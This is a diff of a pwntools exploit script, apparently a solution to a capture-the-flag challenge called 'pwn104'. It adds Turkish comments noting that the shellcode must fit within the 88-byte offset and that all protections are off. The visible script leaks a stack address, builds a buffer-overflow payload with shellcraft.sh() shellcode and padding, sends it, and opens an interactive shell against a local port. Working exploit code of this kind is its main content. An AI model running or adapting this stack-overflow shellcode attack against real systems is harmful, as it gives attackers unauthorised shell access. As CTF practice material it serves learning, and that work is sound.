@@ -32,7 +32,7 @@ print('Leaked input stack address ' + hex(addr))
 offset = 88
 shellcode = asm(shellcraft.sh())
 padding = b'A' * (offset - len(shellcode))
-
+#shellcode'u paddinge sıkıştırıyoruz. 88i geçmemeli.
 
 # Build the payload
 payload = flat([
@@ -48,3 +48,6 @@ io.sendline(payload)
 io.interactive()
 
 #python pwn104.py | python pwn104.py REMOTE 127.0.0.1 9004
+
+
+#TÜM KORUMALAR KAPALI
